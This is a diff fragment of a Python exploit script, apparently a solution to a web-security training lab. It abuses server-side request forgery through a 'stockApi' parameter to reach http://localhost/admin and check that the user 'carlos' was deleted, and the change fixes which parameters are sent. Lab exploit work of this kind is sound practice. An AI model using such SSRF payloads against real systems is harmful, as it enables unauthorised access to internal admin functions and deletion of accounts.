@@ -58,7 +58,7 @@ def delete_user(url):
    # Now checking if it our script actually worked or not - which is here deleting the user name carlos 
     payload2 = 'http://localhost/admin'
     params2 = {'stockApi': payload2}
-    r = requests.post(url + check_stock_path, proxies=proxies, verify=False, data=params)
+    r = requests.post(url + check_stock_path, proxies=proxies, verify=False, data=params2)
     if "User deleted successfully" in r.text:
         print("(+) Successfully deleted Carlos user!")
     else:
